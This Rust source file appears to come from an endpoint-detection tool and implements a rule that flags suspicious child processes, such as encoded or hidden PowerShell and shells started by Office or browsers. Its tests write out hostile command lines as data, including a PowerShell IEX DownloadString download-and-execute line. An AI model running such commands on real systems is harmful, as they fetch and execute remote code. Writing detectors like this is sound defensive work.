//! PRC-001 suspicious child process (`docs/15 §2`), from the embedded `rules/spawn.toml`.
//! The finding belongs to the parent: a script host is a signed OS binary, so marking its own
//! path would mark every use of it.

use std::sync::OnceLock;

use serde::Deserialize;

use super::path::basename;

const SOURCE: &str = include_str!("../../../../rules/spawn.toml");

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct File {
    script: Script,
    shell: Shell,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct Script {
    hosts: Vec<String>,
    encoded_flag_hosts: Vec<String>,
    markers: Vec<String>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct Shell {
    names: Vec<String>,
    office: Vec<String>,
    browsers: Vec<String>,
    browser_native_messaging: Vec<String>,
}

fn data() -> &'static File {
    static F: OnceLock<File> = OnceLock::new();
    F.get_or_init(|| toml::from_str(SOURCE).expect("rules/spawn.toml is validated by tests"))
}

fn listed(list: &[String], name: &str) -> bool {
    list.iter().any(|n| n.eq_ignore_ascii_case(name))
}

/// Cheap pre-filter: only these children are worth reading a command line for.
#[must_use]
pub fn inspects(child_image: &str) -> bool {
    let f = data();
    let child = basename(child_image);
    listed(&f.script.hosts, child) || listed(&f.shell.names, child)
}

/// Whether starting `child_image` with `cmdline` from `parent_image` is PRC-001.
/// All arguments are untrusted host strings and are only compared, never executed.
#[must_use]
pub fn suspicious_child(parent_image: &str, child_image: &str, cmdline: Option<&str>) -> bool {
    let f = data();
    let child = basename(child_image);
    let parent = basename(parent_image);
    let cmd = cmdline.unwrap_or_default().to_ascii_lowercase();
    let shell_from_office = listed(&f.shell.office, parent) && listed(&f.shell.names, child);
    let shell_from_browser = listed(&f.shell.browsers, parent)
        && listed(&f.shell.names, child)
        && !f
            .shell
            .browser_native_messaging
            .iter()
            .any(|m| cmd.contains(m.as_str()));
    let marked = listed(&f.script.hosts, child)
        && (f.script.markers.iter().any(|m| cmd.contains(m.as_str()))
            || (listed(&f.script.encoded_flag_hosts, child) && has_encoded_flag(&cmd)));
    shell_from_office || shell_from_browser || marked
}

/// `-e`, `-en`, … `-encodedcommand` or `-ec` as a separate argument (`/` works too).
fn has_encoded_flag(cmd: &str) -> bool {
    const FULL: &str = "encodedcommand";
    cmd.split_whitespace()
        .filter_map(|a| a.strip_prefix('-').or_else(|| a.strip_prefix('/')))
        .any(|a| a == "ec" || (!a.is_empty() && FULL.starts_with(a)))
}

#[cfg(test)]
mod tests {
    use super::*;

    const PS: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    const CMD: &str = r"C:\Windows\System32\cmd.exe";
    const WORD: &str = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
    const CHROME: &str = r"C:\Program Files\Google\Chrome\Application\chrome.exe";
    const TOOL: &str = r"C:\Users\a\AppData\Local\tool.exe";

    #[test]
    fn data_parses() {
        assert_ne!(data().script.hosts.len(), 0);
    }

    #[test]
    fn encoded_or_hidden_script_hosts_are_flagged() {
        for c in [
            "powershell -NoP -enc SQBFAFgA",
            "powershell.exe -e SQBFAFgA",
            "pwsh /EncodedCommand SQBFAFgA",
            "powershell -ec SQBFAFgA",
            "powershell -w hidden -c calc",
            "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')",
        ] {
            assert!(suspicious_child(TOOL, PS, Some(c)), "{c}");
        }
    }

    #[test]
    fn ordinary_script_use_is_not_flagged() {
        for c in [
            "powershell -NoProfile -ExecutionPolicy Bypass -File build.ps1",
            "powershell -ex bypass -c Get-Date",
            "cmd /d /c echo hi",
        ] {
            assert!(!suspicious_child(TOOL, PS, Some(c)), "{c}");
        }
        assert!(!suspicious_child(TOOL, CMD, None));
    }

    #[test]
    fn office_starting_a_shell_is_flagged_whatever_the_command_line() {
        assert!(suspicious_child(WORD, CMD, Some("cmd /c dir")));
        assert!(suspicious_child(
            WORD,
            CMD,
            Some("cmd /c x chrome-extension://a/")
        ));
    }

    #[test]
    fn browser_native_messaging_hosts_are_exempt() {
        let host = r#"C:\Windows\system32\cmd.exe /d /c "C:\pm\host.exe" chrome-extension://abc/ --parent-window=0 < \\.\pipe\chrome.nativeMessaging.in.1"#;
        assert!(!suspicious_child(CHROME, CMD, Some(host)));
        assert!(suspicious_child(CHROME, CMD, Some("cmd /c whoami")));
    }

    #[test]
    fn prefilter_covers_hosts_and_shells_only() {
        assert!(inspects(PS) && inspects(r"C:\Windows\System32\wsl.exe"));
        assert!(!inspects(r"C:\Windows\notepad.exe"));
    }
}
